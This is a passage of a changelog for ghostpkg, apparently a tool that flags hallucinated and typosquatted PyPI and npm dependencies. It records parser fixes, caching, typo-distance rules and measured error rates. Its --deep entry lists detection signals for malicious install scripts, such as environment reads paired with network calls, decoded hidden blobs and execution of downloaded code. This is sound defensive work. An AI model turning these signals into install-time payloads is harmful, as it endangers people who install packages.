  still printed "all packages look fine". `httpx` is a top-100 PyPI project.
- **`-r` and `-c` includes were ignored**, so a project that splits its
  requirements across files was only half checked. Includes are now followed,
  with cycle detection and a depth limit.

### Fixed -- false blocks
- **Direct references and private indexes.** `internal-lib @ git+https://...`
  was read as the plain name `internal-lib`, which is absent from public PyPI,
  so every internal package in a company using its own index was **blocked**.
  Direct references, `--index-url`, editable installs, local paths and hashes
  are now recognised and skipped.
- **Any `.txt` file was parsed as requirements.** `README.txt` became the
  package list `['Install', 'Run', 'numpy']` -- two confident blocks on prose.
  Only `requirements*.txt`, `constraints*.txt` and `*.in` are accepted now, and
  anything else is refused by name.
- **`--deep` judged packages by install scripts they merely shipped.** Matching
  `setup.py` by basename meant a package vendoring a dependency or including
  packaging test fixtures was blocked on somebody else's code. Only the
  archive's own top-level install script is read.

### Fixed -- wrong exit codes and lost results
- **A connection that failed mid-response escaped as a traceback and exited
  `1`** -- the code meaning "a package does not exist". `urlopen` only wraps
  failures that happen while connecting, so a stalled proxy or a reset
  connection read as a confirmed detection. All lookup failures are now
  `RegistryError`.
- **One failed lookup discarded the entire scan**, including already-confirmed
  blocks, and skipped the cache write so the inevitable retry re-issued every
  request. Failures are now per-name, with a new `ERROR` verdict, and exit
  code `2` -- an unchecked name is never a pass.
- **`ghostpkg scan <directory>`** crashed with a traceback; it now explains
  itself and exits `2`.

### Fixed -- wrong answers
- **npm cache keys collapsed case-distinct packages.** `JSONStream` and
  `jsonstream` are two different real packages; lowercasing both into one key
  served one package's facts for the other, including a wrong `exists`. Keys
  are now normalised per ecosystem -- PEP 503 for PyPI, exact for npm.

### Changed
- **npm lookups now request gzip.** `@types/node` was 10.6 MB per lookup and is
  now 1.35 MB; `react` went from 6.6 MB to 1.30 MB. Responses are also size-capped.
- **Repeated names are looked up once.** Manifests repeat names, and following
  includes makes that more likely.
- `pyproject.toml` now reads PEP 735 `[dependency-groups]`, and Poetry group
  dependencies are found on Python 3.9/3.10 as well as 3.11+.
- `package.json` now reads `peerDependencies`.
- The cache takes a lock around its counters and entry map, and its docstring
  no longer claims threads only read from it -- they do not.

## [0.6.0] - 2026-09-01

### Fixed
- **Typo detection missed parked lookalikes, because age was the wrong gate.**
  The check only ran on packages published within the last year, on the
  reasoning that "an old lookalike is just a package with a similar name". That
  reasoning was wrong. `expresss` has sat on npm since **2016** with one
  release, no repository link, and roughly **2,500 downloads a month** arriving
  purely from other people's typos. Ten years old, and waved straight through.

### Changed
- The typo check now also runs on packages that look **abandoned**: two or fewer
  releases *and* no repository link, at any age.

  The pairing is not a guess. Measured against 120 real packages that sit within
  the typo budget of a popular name:

  | Rule | Wrong about |
  |---|---|
  | Two or fewer releases, alone | 10.0% |
  | No repository link, alone | 5.8% |
  | **Both together** | **0.0%** |

  Either condition alone is too loose because sibling packages in a family sit
  naturally close together — `dagster-k8s` is two edits from `dagster-aws`, and
  `pulumi-tls` from `pulumi-aws`. Those are maintained, so they carry releases
  and a repository, and requiring both conditions leaves them alone.

- Warning text now says which condition fired, rather than calling a
  ten-year-old package "recently published".

### Note
A defensively parked name still passes, which is correct: npm holds `lodahs`
itself and points it at `npm/security-holder`, so it has a repository link.

## [0.5.0] - 2026-09-01

### Added
- **`--deep`: static inspection of install-time code.** This addresses the
  project's main open problem ([#1]) — a hallucinated name an attacker has
  *already registered*. Such a package exists, so the existence check passes,
  and it is young with one release and no repository link, exactly like every
  honest new package. Age cannot separate them; install-time behaviour can,
  because a slopsquat has to run something when it is installed.
- Signals reported: reading environment variables together with a network call,
  a network request, a shell command, decoding a hidden blob, and executing code
  that was just decoded or downloaded.

### How the policy was decided
The previous signal adopted on intuition — scoring packages by age — flagged
100% of legitimate same-day publications. So this one was measured first:

| Group | Flagged |
|---|---|
| 27 established legitimate packages | 0% |
| 32 packages published to PyPI that day | 0% |
| 6 known malicious install-script shapes | 6 of 6 |

That is why a **young** package with install-time signals is **blocked** while
age alone still only warns. An established package with the same signals is
warned about, not blocked.

The first pattern set was far looser and flagged 37% of established packages,
mostly for reading environment variables — ordinary when inspecting build
flags. It also scanned `conftest.py`, which runs during testing and never on
install. Both were mistakes found by measuring rather than by reasoning.

### Safety
Archives are read in memory and never extracted to disk; nothing is executed,
imported or compiled; downloads stop at 8 MB and members at 512 KB so a
decompression bomb cannot exhaust memory; any failure to fetch or parse means
"not inspected" rather than a pass.

[#1]: https://github.com/M1rwana12/ghostpkg/issues/1

## [0.4.0] - 2026-09-01

### Added
- **On-disk cache for registry lookups.** Scanning a 150-package manifest drops
  from 4.7s to 0.4s on a warm cache. Previously every scan cost one request per
  dependency, every run, which is slow in CI and rude to the registry.
- `--no-cache` to bypass it, and `ghostpkg clear-cache` to delete it.
- `GHOSTPKG_CACHE_DIR` to override the location. The default is
  `%LOCALAPPDATA%\ghostpkg` on Windows, `~/Library/Caches/ghostpkg` on macOS and
  `$XDG_CACHE_HOME/ghostpkg` elsewhere, worked out without a dependency.

### Notes on the cache design
- **Time-to-live depends on the answer, and "does not exist" is held for only an
  hour.** A free name can be registered at any moment — that is the whole attack
  — so a negative result must not be trusted for long. Young packages are held
  six hours, established ones a day.
- Cache failures are never fatal. A corrupt file, a wrong schema, a malformed
  entry or an unwritable directory all degrade to no cache rather than breaking
  a run. There are tests for each of those.
- Written atomically via a temporary file and `os.replace`, once per run, so a
  killed process cannot leave a half-written cache behind.

## [0.3.0] - 2026-09-01

### Fixed
- **npm typo detection did not work at all.** Lookalike names were compared
  against the 2,000 most-downloaded *PyPI* projects regardless of ecosystem, so
  `expresss` was never flagged as a typo of `express` -- `express` was not in
  the list being compared against.

### Added
- A list of the 2,000 most-downloaded npm packages, built from the registry's
  own download-count API. `nearest_popular()` now picks the list matching the
  ecosystem.
- Scoped npm names are compared on the part after the slash, since that is what
  a squat targets: `@evil/expresss` is flagged, `@types/node` and `@babel/core`
  are not.

### Changed
- Typo distance is now Damerau-Levenshtein: swapping two adjacent characters
  counts as one edit rather than two. Transposition is the commonest typosquat
  shape, and under plain Levenshtein `recat`, `lodahs` and `webpakc` all scored
  two edits, which put them outside the budget for names that short. All three
  are caught now, and the false-positive rate across both 2,000-name lists is
  still zero -- there are tests asserting exactly that.
- Names shorter than five characters are no longer compared at all. Below that
  the name space is too dense for edit distance to mean anything: `core` sits
  one edit from `cors`.

## [0.2.0] - 2026-09-01

### Fixed
- **`scan` reported nonsense for `pyproject.toml`.** Every file that was not
  `package.json` was handed to the requirements.txt parser, so TOML keys were
  read as package names: `build-backend` came back "does not exist on pypi",
  and `version` came back "ok" because a package of that name exists. For a
  security tool, confidently reporting nonsense is the worst failure mode.

### Added
- `pyproject.toml` support in `scan`: PEP 621 `project.dependencies` and
  `project.optional-dependencies`, plus Poetry's `tool.poetry` groups.
  `[build-system] requires` is excluded, and Poetry's `python` constraint is
  not treated as a package.
- Manifests are now detected explicitly. An unrecognised file is **refused with
  an error rather than guessed at** — guessing was the root cause of the bug
  above.
- A narrow TOML fallback parser for Python 3.9 and 3.10, which have no
  `tomllib`. Adding a TOML dependency would contradict the zero-dependency rule,
  and the fallback is tested by forcing the import to fail rather than by
  trusting the interpreter the suite runs on.

### Changed
- `--version` now reads `__version__` instead of a hardcoded string.

## [0.1.0] - 2026-09-01

First release.

### Added
- `ghostpkg check` — check one or more package names against PyPI or npm.
- `ghostpkg scan` — check every dependency in `requirements.txt` or `package.json`.
- Verdicts: `BLOCK` for names absent from the registry, `WARN` for weak signals
  (recent publication, single release, missing repository link, small edit
  distance to a popular name), `OK` otherwise.
- `--strict` to promote warnings to blocks, `--json` for machine-readable output,
  `-q/--quiet` to hide passing packages.
- Exit codes: `0` nothing blocked, `1` something blocked, `2` usage or registry
  error.
- Bundled list of the 2,000 most-downloaded PyPI projects, used only for typo
  distance.

### Notes on the design
- The default profile blocks on **non-existence only**. An earlier version scored
  packages and blocked anything suspicious; measured against the live feed of
  newly published PyPI packages, it flagged 100% of legitimate same-day
  publications. Age cannot separate a malicious registration from an honest new
  release, so softer signals are warnings.
- The typo-distance budget scales with name length. A flat budget flagged `flask`,
  `click` and `black` as typos of one another.
- Zero runtime dependencies, by policy.
- No corpus of hallucinated package names is shipped, following the decision of
  the USENIX'25 authors not to publish theirs.

[Unreleased]: https://github.com/M1rwana12/ghostpkg/compare/v0.24.1...HEAD
[0.24.1]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.24.1
[0.24.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.24.0
[0.23.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.23.0
[0.22.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.22.0
[0.21.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.21.0
[0.20.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.20.0
[0.19.3]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.19.3
[0.19.2]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.19.2
[0.19.1]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.19.1
[0.19.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.19.0
[0.18.1]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.18.1
[0.18.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.18.0
[0.17.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.17.0
[0.16.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.16.0
[0.15.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.15.0
[0.14.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.14.0
[0.13.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.13.0
[0.12.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.12.0
[0.11.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.11.0
[0.10.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.10.0
[0.9.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.9.0
[0.8.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.8.0
[0.7.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.7.0
[0.6.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.6.0
[0.5.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.5.0
[0.4.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.4.0
[0.3.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.3.0
[0.2.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.2.0
[0.1.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.1.0
